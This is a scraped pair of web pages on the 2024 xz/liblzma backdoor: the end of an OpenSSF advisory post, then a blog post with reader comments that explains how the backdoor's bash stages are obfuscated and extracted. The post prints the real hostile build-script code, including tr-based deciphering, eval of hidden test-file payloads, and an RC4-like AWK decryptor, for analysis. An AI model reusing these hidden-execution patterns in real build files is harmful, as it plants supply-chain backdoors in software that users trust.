Thankfully, the number of systems affected by this backdoor is relatively low as this version of xz was not broadly distributed by distros and was caught quickly. The thoughtful, paced release process of first introducing new packages to “experimental” releases, prior to rolling them into “stable” releases served the community well by keeping the compromised packages contained to a narrow distribution. Cooperation between the distributions through venues such as the [oss-security and distros mailing lists](https://openssf.org/blog/2023/11/14/openssf-supports-oss-security-and-linux-distros-mailing-lists/) allowed quick and decisive resolution to this compromise.

Situations like this remind us all that we need to remain vigilant within the open source software ecosystem. Open source is about well-intentioned humans donating their time and talents to help solve problems, and sadly this can be compromised. As we all learn more details about the anatomy of this attack and the upstream and downstream response, it will give us time to reflect upon how we all can do more to secure open source software and help maintainers and consumers alike.

The OpenSSF encourages everyone to verify that they are not using a vulnerable version of this software, especially if using one of the experimental or bleeding edge distributions or repositories.

## React Faster in the Next Supply Chain Compromise

Writing and maintaining open source software is a very hard and often thankless task. It is equally hard being downstream from that act of creation as an enterprise operator. Good cybersecurity is equal parts prevention and cure. Therefore, OpenSSF encourages our community of security experts, maintainers, developers, and open source advocates to join in the conversation in the coming days and weeks so that we can start to collaborate on how to better assist ALL participants within our open source ecosystem.

One way to participate is during the upcoming [SOSS Community Day North America](https://events.linuxfoundation.org/soss-community-day-north-america/) event on April 15, where we will conduct a tabletop exercise that simulates an open source supply chain attack. The goal of this exercise is to provide the community with guidance on how to react when the next supply chain compromise occurs. We hope you’ll join us!

*Updated on April 1, 2024 at 9:50AM ET*

### We envision a future where OSS is universally trusted, secure, and reliable. Join us in making open source more secure.

[Get Involved](/getinvolved/)

### Subscribe to the OpenSSF Newsletter!

#### Get the latest announcements, event info, and the community news in your inbox

* [twitter](https://twitter.com/openssf)
* [facebook](https://www.facebook.com/openssf)
* [linkedin](https://www.linkedin.com/company/openssf/)
* [youtube](https://www.youtube.com/c/OpenSSF/)
* [github](https://github.com/ossf)
* [mastodon](https://social.lfx.dev/%40openssf)

Copyright © 2024 The Linux Foundation® . All rights reserved. The Linux Foundation has registered trademarks and uses trademarks. For a list of trademarks of The Linux Foundation, please see our [Trademark Usage](https://www.linuxfoundation.org/trademark-usage) page. Linux is a registered trademark of Linus Torvalds. [Privacy Policy](https://www.linuxfoundation.org/privacy) and [Terms of Use](https://www.linuxfoundation.org/terms).

Close Menu

* [About](https://openssf.org/about/)
  + [About OpenSSF](https://openssf.org/about/)
    - [Governing Board](https://openssf.org/about/board/)
    - [Technical Advisory Council](https://openssf.org/about/tac/)
    - [Staff](https://openssf.org/about/staff/)
    - [Charter](https://openssf.org/about/charter/)
    - [Antitrust Policy](https://www.linuxfoundation.org/legal/antitrust-policy)
    - [Brand Guidelines](https://openssf.org/about/brand-guidelines/)
  + [Contact Us](https://openssf.org/about/contact/)
  + [Members](https://openssf.org/about/members/)
* Contributors
  + [Get Involved](https://openssf.org/getinvolved/)
  + [Slack](https://slack.openssf.org)
  + [Working Groups](https://openssf.org/community/openssf-working-groups/)
  + [OpenSSF GitHub](https://github.com/ossf)
  + [Jobs Board](https://openssf.jobboard.io/)
  + [Swag Store](https://openssf.myspreadshop.com/)
  + [Code of Conduct](https://openssf.org/community/code-of-conduct/)
* Technical Initiatives
  + [Projects](https://openssf.org/projects/)
  + [Tech Talks](https://openssf.org/resources/tech-talks/)
  + [For Developers](https://best.openssf.org/developers)
* [Training & Guides](https://openssf.org/training)
  + [Certification: Secure Software Fundamentals](https://openssf.org/training/courses/)
  + [Training: Using Scorecard](https://openssf.org/training/securing-projects-with-openssf-scorecard-course/)
  + [Training: Using Sigstore](https://openssf.org/training/securing-your-software-supply-chain-with-sigstore-course/)
  + [Comprehensive Security Guides](https://openssf.org/resources/guides/)
* [Blog & Resources](https://openssf.org/blog/)
  + [Blogs](https://openssf.org/blog/)
    - [Submit a Blog](https://openssf.org/community/blog-guidelines/)
  + [Podcast 🎤](https://openssf.org/podcast/)
  + [Case Studies](https://openssf.org/case-studies/)
  + [Newsletter](https://openssf.org/newsletter/)
  + [Press Releases](https://openssf.org/news/)
  + [Reports](https://openssf.org/resources/publications/)
* [Events](https://openssf.org/events/)
  + [Global OpenSSF Events Calendar](https://openssf.org/events/)
    - [All Linux Foundation Events](https://events.linuxfoundation.org/)
  + [Virtual Town Halls](https://openssf.org/townhalls/)
  + [Guidelines for Meetups](https://openssf.org/community/meetup-guidelines/)
* [Join](https://openssf.org/join/)



=== Content from gynvael.coldwind.pl_17fe6e26_20250111_034018.html ===

# [gynvael.coldwin//vx.log](/?blog=1)

![](/images/something_suspicious.png)
[Available for Consulting and Projects](https://hexarcana.ch/?utm=gyn-blog)
[Upcoming Talks](https://hexarcana.ch/workshops/?utm=gyn-blog-w)

![](/img/gynvael-close.jpg)

* [Return to dashboard ⇪](/)

### *Sections*

* **lang**: [![PL](/images/lang_pl.png)](?blog=1&lang=pl) | [![EN](/images/lang_en.png)](?blog=1&lang=en)
* **RSS**: [![RSS PL](/images/lang_pl.png)](/rss_pl.php) | [![RSS EN](/images/lang_en.png)](/rss_en.php)
* [About me](?id=50)
* [Tools](?id=182)
* [→ YT YouTube (EN)](https://youtube.com/c/GynvaelEN)
* [→ D Discord](/discord)* [→ M Mastodon](https://infosec.exchange/%40gynvael)* [→ T Twitter](https://twitter.com/gynvael)* [→ GH GitHub](https://github.com/gynvael)

        [![](/img/hexarcana160_2.png)](https://hexarcana.ch)

        [My company's website](https://hexarcana.ch)

        [![](/img/po_issue_5_rbanner.png)](https://pagedout.institute/)

        [Paged Out! zine](https://pagedout.institute/)

        [![](/img/ds_logo_160.jpg)](https://dragonsector.pl/)

        [Dragon Sector CTF Team](https://dragonsector.pl/)

### *Links / Blogs*

* [→ dragonsector.pl](http://dragonsector.pl)
* [→ vexillium.org](http://vexillium.org)
* **Security/Hacking:**
  + [j00ru's blog](http://j00ru.vexillium.org/?lang=en)
  + [lcamtuf's blog](http://lcamtuf.blogspot.com/)
  + [invisible things (new)](http://blog.invisiblethings.org/)
  + [invisible things (old)](http://theinvisiblethings.blogspot.com/)
  + [liveoverflow's site](http://liveoverflow.com/)
  + [/dev/null's site](https://d3vnull.com/)
  + [pi3's blog](http://blog.pi3.com.pl/)
  + [icewall's blog](http://icewall.pl/)
  + [taviso's blog](http://blog.cmpxchg8b.com/)
  + [pawel's blog](http://wampir.mroczna-zaloga.org/)
  + [sandeep's blog](http://www.sandeepkamble.com/)
  + [koto's blog](http://blog.kotowicz.net/)
  + [carstein's blog](http://128nops.blogspot.ch/)
  + [zaufana trzecia strona](http://zaufanatrzeciastrona.pl/)
  + [niebezpiecznik](https://niebezpiecznik.pl/)
  + [sekurak](https://sekurak.pl/)
* **Reverse Eng./Low-Level:**
  + [rewolf's blog](http://blog.rewolf.pl/blog/)
  + [gdtr](http://gdtr.wordpress.com/)
  + [spinning mirrors](http://omeg.pl/)
  + [security news](https://www.secnews.pl/)
  + [rev3rsed](http://rev3rsed.blogspot.com/)
* **Programming/Code:**
  + [/dev/krzaq](https://dev.krzaq.cc/)
  + [sil2100/vx's web log](http://sil2100.vexillium.org/)
  + [adam sawicki](http://asawicki.info/)
  + [devkk.net](http://devkk.net/)
  + [xion.log](http://xion.org.pl/)

### *Posts*

* [Paged Out! #5 is out,](?id=797)
* [CVEs of SSH talk this Thursday,](?id=796)
* [Debug Log: Internet doesn't work (it was the PSU),](?id=793)
* [FAQ: The tragedy of low-level exploitation,](?id=791)
* [Solving Hx8 Teaser 2 highlight videos!,](?id=789)
* [Gynvael on SECURITYbreak podcast,](?id=788)
* [Paged Out! #4 is out,](?id=786)
* [I won't be able to attend CONFidence'24 after all :(,](?id=785)
* [xz/liblzma: Bash-stage Obfuscation Explained,](?id=782)
* [Two of my bookmarklets: image extraction and simple TTS,](?id=781)
* [→ see all posts on main page](/)

// copyright © Gynvael Coldwind

// design & art by Xa

// logo font (birdman regular) by utopiafonts / Dale Harris

/\* the author and owner of this blog hereby allows anyone to test the security of this blog (on HTTP level only, the server is not mine, so let's leave it alone ;>), and try to break in (including successful breaks) without any consequences of any kind (DoS attacks are an exception here) ... I'll add that I planted in some places funny photos of some kittens, there are 7 of them right now, so have fun looking for them ;> let me know if You find them all, I'll add some congratz message or sth ;> \*/

**Vulns found in blog:**

\* XSS *(pers, user-inter)* by ged\_

\* XSS *(non-pers)* by Anno & Tracerout

\* XSS *(pers)* by Anno & Tracerout

\* Blind SQLI by Sławomir Błażek

\* XSS *(pers) by* Sławomir Błażek

2024-03-30:
## [xz/liblzma: Bash-stage Obfuscation Explained](?id=782)

xz:liblzma

Yesterday [Andres Freund emailed oss-security@](https://www.openwall.com/lists/oss-security/2024/03/29/4) informing the community of the discovery of a backdoor in xz/liblzma, which affected OpenSSH server (huge respect for noticing and investigating this). Andres' email is an amazing summary of the whole drama, so I'll skip that. While admittedly most juicy and interesting part is the obfuscated binary with the backdoor, the part that caught my attention – and what this blogpost is about – is the initial part in bash and the simple-but-clever obfuscation methods used there. Note that this isn't a full description of what the bash stages do, but rather a write down of how each stage is obfuscated and extracted.

P.S. Check the comments under this post, there are some good remarks there.

## Before we begin

We have to start with a few notes.

First of all, there are two versions of xz/liblzma affected: 5.6.0 and 5.6.1. Differences between them are minor, but do exist. I'll try to cover both of these.

Secondly, the bash part is split into three (four?) stages of interest, which I have named Stage 0 (that's the start code added in m4/build-to-host.m4) to Stage 2. I'll touch on the potential "Stage 3" as well, though I don't think it has fully materialized yet.

Please also note that the obfuscated/encrypted stages and later binary backdoor are hidden in two test files: tests/files/bad-3-corrupt\_lzma2.xz and tests/files/good-large\_compressed.lzma.

## [Stage 0](#stage0)

As pointed out by Andres, things start in the [m4/build-to-host.m4](https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63) file. Here are the relevant pieces of code:

`...
gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
...
gl_path_map='tr "\t \-_" " \t_\-"'
...`

This code, which I believe is run somewhere during the build process, extracts Stage 1 script. Here's an overview:

1. Bytes from tests/files/bad-3-corrupt\_lzma2.xz are read from the file and outputted to standard output / input of the next step – this chaining of steps is pretty typical throughout the whole process. After everything is read a newline (\n) is added as well.
2. The second step is to run tr (translate, as in "map characters to other characters", or "substitute characters to target characters"), which basically changes selected characters (or byte values) to other characters (other byte values). Let's work through a few features and examples, as this will be imporant later.

   The most basic use looks like this:
   `echo "BASH" | tr "ABCD" "1234"
   21SH`
   What happend here is "A" being mapped to (translated to) "1", "B" to "2", and so on.

   Instead of characters we can also specify ranges of characters. In our initial example we would just change "ABCD" to "A-D", and do the same with the target character set: "1-4":
   `echo "BASH" | tr "A-D" "1-4"
   21SH`

   Similarly, instead of specyfing characters, we can specify their ASCII codes... in octal. So "A-D" could be changed to "\101-\104", and "1-4" could become "\061-\064".
   `echo "BASH" | tr "\101-\104" "\061-\064"
   21SH`

   This can also be mixed - e.g. "ABCD1-9\111-\115" would create a set of A, B, C, D, then numbers from 1 to 9, and then letters I (octal code 111), J, K, L, M (octal code 115). This is true both for the input characters set and the target character set.

   Going back to the code, we have tr "\t \-\_" " \t\_\-", which does the following substitution in bytes streamed from the tests/files/bad-3-corrupt\_lzma2.xz file:
   * 0x09 (\t) are replaced with 0x20,
   * 0x20 (whitespace) are replaced with 0x09,
   * 0x2d (-) are replaced with 0x5f,
   * 0x5f (\_) are replaced with 0x2d,This actually "uncorrupts" the bad-3-corrupt\_lzma2.xz, which forms a proper xz stream again.
3. In the last step of this stage the fixed xz byte stream is extracted with errors being ignored (the stream seems to be truncated, but that doesn't matter as the whole meaningful output has already been written out). The outcome of this is the Stage 1 script, which is promptly executed.

## [Stage 1](#stage1)

In Andres' email that's the bash file starting with "####Hello####", which is pretty short, so let's present it here with differences between 5.6.0 and 5.6.1 marked with black background.

`####Hello####
# a few binary bytes here, but as it's a comment they are ignorred
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +939)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
####World####`

The first difference are the random bytes in the comment on the second line.

* In version 5.6.0 it's 86 F9 5A F7 2E 68 6A BC,
* and in 5.6.1 that's E5 55 89 B7 24 04 D8 17.

I'm not sure if these differences are meaningful in any way, but wanted to note it.

The check whether the script is running on Linux was added in 5.6.1, and the fact that it's repeated 5 times makes this pretty funny – was someone like "oops, forgot this last time and it cause issues, better put it in 5 times as an atonement!"?

We'll get back to the remaining differences later, but for now let's switch to Stage 2 extraction code, which is that huge export i=... line with a lot of heads. As previously, let's go step by step:

1. The export i=... at the beginning is basically just a function "definition". It's being invoked in step 3 (as well as in Stage 2), so we'll get to it in a sec (also, it's simpler than it looks).
2. The first actual step in the extraction process of Stage 2 is the decompression (xz -dc) of the good-large\_compressed.lzma file to standard output. This, as previously, starts a chain of outputs of one step being used as inputs in the next one.
3. Now we get to the i function invocation (eval $i). This function is basically a chain of head calls that either output the next N bytes, or skip (ignore) the next N bytes.

   At the very beginning we have this:
   `(head -c +1024 >/dev/null)`
   The -c +1024 option there tells head to read and output only the next 1024 bytes from the incoming data stream (note that the + there is ignored, it doesn't do anything, unlike in tail). However, since the output is redirected in this case to /dev/null, what we effectively get is "skip the next 1024 bytes".

   This is a good moment to note, that if we look at the first 1024 bytes in the uncompressed data stream from the good-large\_compressed.lzma file, it's basically the "A" character (byte 0x41) repeated 1024 times. To add a bit of foreshadowing, after the first 1024 characters there is some binary data.

   The next head call looks almost identical, with a different length:
   `head -c +2048`
   Note that in this case output is not ignored – it will actually be passed to the next step as input.

   And this pattern repeats: 1024 bytes are ignored, than 2048 bytes are outputted, 1024 bytes ignored, 2048 outputted... and so on until we get to the very end of the file where only 724 bytes (in 5.6.0) or 939 bytes (in 5.6.1) are outputted.

   To visualize this, here's the actual input data that's processed by this set of head calls. Byte 0 is on top-left of the file; each column represents 256 bytes of the file as grayscale. Note the "empty gray" regions between the high entropy ("noisy") areas – what this part of the script does is basically just removing the empty regions and merging the regions with actual data together.

   ![](img/good-large_compressed.data.png)
   →
   ![](img/stage1_carved.data.png)
4. In the next step – tail -c +31233 – the initial portion of the data is discarded (spoiler: it hides the binary backdoor, which is extracted in the next Stage, so it's not needed now). In 5.6.0 that would be the first 31264 bytes and in the 5.6.1 that's 31232 (the one-off difference is because of tail -c +N means "start outputting from byte N" and not "ignore first N bytes").
5. Step 5 revisits the tr command, which in this case is used as a very simple substitution cipher, with key (byte value mapping) being different in 5.6.0 and 5.6.1:
   `5.6.0: tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377"
   5.6.1: tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377"`
   As per previous explanation, this basically means that (for 5.6.0) byte of value 5 will be substitute with byte of value 0, byte of value 6 will be substituted with byte of value 1, and so on. In each case there are 6 ranges which map to the whole 0 - 255 (that's 377 octal) range.
6. In the last step the deciphered data is decompressed (xz -F raw --lzma1 -dc) and the resulting Stage 2 is promptly executed.

## [Stage 2](#stage2)

Stage 2 is the [infected.txt](https://www.openwall.com/lists/oss-security/2024/03/29/4/1) file attached by Andres in the original email (that's the 5.6.0 version btw). There's a lot going on in this bash script, as this is where the actual compilation process modification happens.

From the perspective of obfuscation analysis, there are three interesting fragments to this script, **two of which appear only in the 5.6.1 version**. Let's start with them, as they are also simpler.

### [Stage 2 "extension" mechanism](#stage2-ext)

Fragment 1:

`vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null`
if test "x$vs" != "x" > /dev/null 2>&1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" > /dev/null 2>&1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2>/dev/null`
if test "x$ve" != "x" > /dev/null 2>&1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" > /dev/null 2>&1;then
[ ! "x$f2" = "x$f1" ] && exit 0
[ ! -f $f1 ] && exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
fi
fi
fi
fi`

Fragment 3:

`vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
if test "x$vs" != "x" > /dev/null 2>&1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" > /dev/null 2>&1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
if test "x$ve" != "x" > /dev/null 2>&1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" > /dev/null 2>&1;then
[ ! "x$f2" = "x$f1" ] && exit 0
[ ! -f $f1 ] && exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
fi
fi
fi
fi`

These two fragments are pretty much identical, so let's handle both of them at the same time. Here's what they do:

1. First of all they try to find (grep -broaF) two files in tests/files/ directory which contain the following bytes (signature):
   `Fragment 1: "~!:_ W" and "|_!{ -"
   Fragment 3: "jV!.^%" and "%.R.1Z"`
   Note that what's actually outputted by grep in this case has the following format: file\_name:offset:signature. For example:
   `$ grep -broaF "XYZ"
   testfile:9:XYZ`
2. If such file is found, the offset for each file is extracted (cut -d: -f2, which takes the 2nd field assuming : is the field delimiter), and the first offset + 7 is saved as $start, and the second offset from the second file is saved as $end.
3. Once the script has the $start and $end offsets, it carves out that part of the file-that-had-the-first-signature:
   `cat $f1 | tail -c +${start} | head -c +${end}`
4. And what follows is first the substitution cipher (using the 5.6.0 version key from Stage 1 btw):
   `tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377"`
5. and then decompressing the data for it to be promptly executed:
   `eval `... | xz -F raw --lzma2 -dc``

Note that in neither of the investigated TAR archives (5.6.0 and 5.6.1) there were any files with any of the signatures. This whole thing basically looks like an "extension/patching" system that would allow adding future scripts to be run in the context of Stage 2, without having to modify the original payload-carrying test files. Which makes sense, as modyfing a "bad" and "good" test files over and over again is pretty suspicious. So the plan seemed to be to just add new test files instead, which would have been picked up, deciphered, and executed.

### [Stage 2 backdoor extraction](#stage2-backdoor)

As pointed out by Andres in the original e-mail, at some point an .o file is extracted and weaved into the compilation/linking process. The following code is responsible for that (again, differences between versions are marked with black background):

`N=0
W=88664
else
N=88664
W=0
fi
xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true`

The differences between versions boil down to the size of the compressed-but-somewhat-mangled payload – that's 88792 in 5.6.0 and 88664 in 5.6.1 – and one value change in the AWK script, to which we'll get in a second.

As in all previous cases, the extraction process is a chain of commands, where the output of one command is the input of the next one. Furthermore, actually some steps are identical as in Stage 1 (which makes sense, since – as I've mentioned – they binary payload resides in the previously ignored part of the "good" file data). Let's take a look:

1. The first step is identical as step 2 in Stage 1 – the tests/files/good-large\_compressed.lzma file is being extracted with xz.
2. Second step is in turn identical as step 3 in Stage 1 – that was the "a lot of heads" "function" invocation.
3. And here is where things diverge. First of all, the previous output get's mangled with the sed command:
   `LC_ALL=C sed "s/\(.\)/\1\n/g"`
   What this does, is actually putting a newline character after each byte (with the exception of the new line character itself). So what we end up with on the output, is a byte-per-line situation (yes, there is a lot of mixing "text" and "binary" approaches to files in here). This is actually needed by the next step.
4. The next step is an AWK script (that's a simple scripting language for text processing) which does – as mak pointed out for me – [RC4...ish](https://en.wikipedia.org/wiki/RC4) decription of the input stream. Here's a prettyfied version of that script:
   `BEGIN { # Initialization part.
   FS = "\n"; # Some AWK settings.
   RS = "\n";
   ORS = "";
   m = 256;
   for(i=0;i<m;i++) {
   t[sprintf("x%key", i)] = i;
   key[i] = ((i * 7) + 5) % m; # Creating the cipher key.
   }
   i=0; # Skipping 4096 first bytes of the output PRNG stream.
   j=0; # ↑ it's a typical RC4 thing to do.
   for(l = 0; l < 4096; l++) { # 5.6.1 uses 8192 instead.
   i = (i + 1) % m;
   a = key[i];
   j = (j + a) % m;
   key[i] = key[j];
   key[j] = a;
   }
   }
   { # Decription part.
   # Getting the next byte.
   v = t["x" (NF < 1 ? RS : $1)];
   # Iterating the RC4 PRNG.
   i = (i + 1) % m;
   a = key[i];
   j = (j + a) % m;
   b = key[j];
   key[i] = b;
   key[j] = a;
   k = key[(a + b) % m];
   # As pointed out by [@nugxperience](https://twitter.com/nugxperience/status/1773906926503591970), RC4 originally XORs the encrypted byte
   # with the key, but here for some add is used instead (might be an AWK thing).
   printf "%key", (v + k) % m
   }`
5. After the input has been decrypted, it gets decompressed:
   `xz -dc --single-stream`
6. And then bytes from N (0) to W (~86KB) are being carved out using the same usual head tricks, and saved as liblzma\_la-crc64-fast.o – which is the final binary backdoor.
   `((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o`

## Summary

Someone put a lot of effort for this to be pretty innocent looking and decently hidden. From binary test files used to store payload, to file carving, substitution ciphers, and an RC4 variant implemented in AWK all done with just standard command line tools. And all this in 3 stages of execution, and with an "extension" system to future-proof things and not have to change the binary test files again. I can't help but wonder (as I'm sure is the rest of our security community) – if this was found by accident, how many things still remain undiscovered.

## Comments:

2024-03-30 20:18:29 = [xeb](http://)
{Can't wait for writeup of the analysis of the binary part... :)}

2024-03-30 20:31:25 = [Fox](http://)
{I appreciate such a clean write-up, your style doesn't beat around the bush and is probably the best analysis that gets right to the point that I find most interesting. I will bookmark this site!}

2024-03-30 20:34:54 = [Rhialto](http://)
{Here are some notes I made, It's not written up as nicely as yours but there are some details that you could fill in in your version.
}

2024-03-30 20:42:58 = [youdabest](http://)
{gynvael- would love to watch an english live stream reveresing session on the payload. miss your youtube content tremendously!}

2024-03-30 20:54:53 = [Wolf480pl](http://)
{I was wondering about the test file's interleaved low-entropy and high-entropy areas.
}

2024-03-30 20:56:06 = [sed](http://sedcore.eu.org)
{Very nice analysis.
}

2024-03-30 21:02:39 = [TrojanWoodCombustible](http://)
{Really nice and high quality analysis, and that's only the bash part.
}

2024-03-30 21:13:42 = [pnt](http://)
{Could someone please explain how this concerns sshd in such a way that it can allow a login without prior knowledge of password and password?}

2024-03-30 22:27:19 = [Me](http://)
{Thank you so much gynvael.
}

2024-03-31 00:12:19 = [OMO](https://security.sios.jp/)
{It's really nice analysis! Many thanks!!
}

2024-03-31 00:24:40 = [alexshpilkin](http://)
{Re XORing or not, this is indeed most likely an AWK thing: AWK lacks XOR, it lacks any bitwise operations in fact. It only understands double-precision floating point as far as numbers go, and evidently its authors either did not think of or did not bother to implement the hack JavaScript (and Lua BitOp) later invented for this situation.
}

2024-03-31 01:15:39 = [EmmanuelDgz](http://www.emmanueldgz.com)
{I thought "simple" attacks were possible only in the 90's. What a shame using amazing skills for bad.}

2024-03-31 01:50:11 = [ceretullis](http://)
{Probably a dumb observation... but, could the binary data in the line 2 comment be an IP addresses?
}

2024-03-31 01:56:48 = [somebody](http://)
{It is terrifying knowing that this was discovered by accident and it makes me wonder what else might be hiding in our systems. Few things are still unclear to me:
}

2024-03-31 04:42:19 = [Stan](http://)
{2. Lasse Collins is the maintainer of xz, and apparently a real person. He posted some info on the xz project server: https://tukaani.org/xz-backdoor/ Expect more info in early April
}

2024-03-31 06:58:01 = [tfr](http://)
{Lasse Collin is the original author of xz. Jia Tan started submitting PR-s and then slowly worked his way up to gaining Lasse's trust and becoming a package contributor at first and then release manager.

Jia's and Lasse's interaction and the backstory is documented pretty well here:
https://boehs.org/node/everything-i-know-about-the-xz-backdoor}

2024-03-31 07:22:06 = [Mention](http://)
{@somebody Lasse Collins is a real person, a lone OSS developer and a victim in this case. He blogged about this: https://tukaani.org/xz-backdoor/}

2024-03-31 08:51:17 = [Michał](http://)
{@EmmanuelDgz

Look at the opposite direction you will certainly find shame there. One man to rule them all. What just happened is historic. Probably an individual action, a human being with patience, simplicity, normality in a world of AI that walks on its head, nothing could be easier to shake.

As for the software, I hope that anew one written from scratch is already underway. You would have to be really stupid to continue using the current software after admitting to not knowing the extent of the damage.}

2024-03-31 09:16:16 = [Michał](http://)
{@somebody

How do you know he is a victim, maybe he is, but I don't know and I'm not interested in that because the important thing here is the software and it has been corrupted . The answer is simple and obvious, you have to eliminate this software for a new one that does the same thing. This is why I have no doubt... that the best free and open source developers have already gathered around a table to rewrite one that will do the same thing as the old one and even better.}

2024-03-31 09:21:10 = [ralfj](http://)
{Thanks for the amazing writeup!

Just one comment, 377 octal is 255 decimal. (The text says it's 256.)}

2024-03-31 09:22:40 = [Gynvael Coldwind](.)
{@ralfj
Thanks, fixed!}

2024-03-31 10:10:37 = [fidgetingbits](http://)
{Nice writeup, thanks for sharing! Typo: "specyfing"}

2024-03-31 10:29:45 = [Romiras](https://romiras.github.io/projects.html)
{> The first difference are the random bytes in the comment on the second line.

I assume an attacker added it for controlling checksum or something about compression payload.}

2024-03-31 10:57:19 = [doekia](http://)
{I can't stop thinking this is a spy agency job. I mean hackers will try to have quick return on investment, while here it is like it does not matter.
This remind me of such spyware #pegasus that use unknown security breach to provide spy service for governmental agencies.

So far Linux is quite "terra incognita" for spy forensic assuming someone want to definitely obfuscate its data content - and implement proper scheme. Such breach is part of an attempt to bridge such gap.
}

2024-03-31 11:47:34 = [someone](http://)
{@somebody
> 4. Someone with this level of sophistication is perfectly capable of discovering exploitable vulnerabilities on his own, so what was even the point of going the supply chain route? Unless his target is \_everyone\_, but I still don't understand his motivation. It can't be financial, because his skills can net him a huge amount of money legally.

It may be easy for you to net a huge amount of money legally using your skills, but not everyone lives in a country where such opportunities are readily available. The world is not a meritocracy, there are hugely talented people who are working for pennies.}

2024-03-31 18:32:30 = [markhahn](http://)
{The social-engineering part of this is interesting, but I wonder how we can make other aspects more robust.

For instance, this attack gains a lot by use of eval. Is that sort of usage actually common in this kind of build mechanism? Restricting builds to simpler tools and safer, less powerful subsets of behavior would make sense to me. I can't help think of the old Perl concept of "tainted" content - would that help here?

So much else (like obfuscated pipelines) is tied to the affordances of social-engineering in the maintainer ecosystem. That few people have a lot of attention to spare, so little things can be smuggled through a chunk at a time.

Very nice writeup, and thanks!}

2024-03-31 19:09:51 = [hanwen](https://hanwen.home.xs4all.nl/)
{> This code, which I believe is run somewhere during the build process, extracts Stage 1 script.

The step that links liblzma (generating src/liblzma/.libs/liblzma.a among others) looks like:

 echo -n ''; export top\_srcdir='../..'; export CC='gcc'; ...; export liblzma\_la\_LIBADD=''; sed rpath ../../tests/files/bad-3-corrupt\_lzma2.xz | tr "\t \-\_" " \t\_\-" | xz -d 2>/dev/null | /bin/sh >/dev/null 2>&1; /bin/sh ../../libtool --tag=CC --mode=link gcc -pthread [snip lots of options] -o liblzma.la -rpath [lots of object files]

the sed command reading the exploit is appended to the LTDEPS variable in the Makefile, and enters the link command through the
AM\_V\_CCLD makefile variable.
}

2024-03-31 19:14:58 = [prophet](http://)
{i think Jia Tan is an AI}

2024-04-01 15:30:14 = [Hibryda](http://)
{On a more general note, I guess it could be beneficial to test operation of most basal Linux utilities with respect to their performance.
These utilities are meant to be atomic and fast. As the example shows, when there's a backdoor involved, computation consumption hikes (both at installation and operation) with respect to clean versions.
Any hike between versions should draw attention. Such effort could and should be organized as this particular case can be only a tip of an iceberg.
The proposed solution does not involve code analysis, just behavioral comparison. Code analysis comes later when irregularity is caught. Therefore it's economically sound and easy to implement.}

2024-04-01 22:15:28 = [Michał](http://)
{@prophet

I think Jia Tan is a contraction of Jia Le Tan / Tan Jia Le.}

2024-04-02 02:10:43 = [jpf](https://github.com/filevich)
{> if this was found by accident, how many things still remain undiscovered.

🤯🤯

thanks for the post/explanation!}

2024-04-02 03:40:52 = [Some guy](http://)
